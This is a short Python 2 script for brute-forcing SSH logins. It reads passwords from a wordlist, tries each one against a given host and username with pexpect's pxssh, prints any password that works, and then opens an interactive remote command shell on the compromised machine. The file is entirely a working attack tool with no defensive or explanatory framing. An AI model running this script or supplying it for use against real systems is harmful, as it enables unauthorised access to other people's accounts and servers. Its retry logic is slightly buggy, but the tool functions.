#!/usr/bin/python
from pexpect import pxssh
import argparse
import time

def SSHConnect(host, username, password):
	Fails = 0

	try:
		s = pxssh.pxssh()
		s.login(host, username, password)
		print "Password Found: " + password
		return s
	except Exception, x:
		if Fails > 5:
			print "[!]Socket Timed Out"
			exit(0)
		elif "read_nonblocking" in str(x):
			Fails += 1
			time.sleep(5)
			return SSHConnect(host, username, password)
		elif "synchronize with original prompt" in str(x):
			time.sleep(1)
			return SSHConnect(host, username, password)
		return None

def Main():
	parser = argparse.ArgumentParser()
	parser.add_argument("host", help="Please specifiy Target Host")
	parser.add_argument("username",help="Specify Target Username")
	parser.add_argument("file", help="Specify Password File")
	args = parser.parse_args()

	if args.host and args.username and args.file:
		with open(args.file, 'r') as ifile:
			for line in ifile:
				password = line.strip("\r\n")
				print "Testing: " + str(password)
				con = SSHConnect(args.host, args.username, password)
				if con:
						print "[!]SSH Connection has been established, Issue Commands type Q to quit."
						cmd = raw_input("$ ")
						while cmd != 'q' and cmd != 'Q':
							con.sendline(cmd)
							con.prompt()
							print con.before
							cmd = raw_input("$ ")
	else:
		print parser.usage
		exit(0)
if __name__ == '__main__':
	Main()
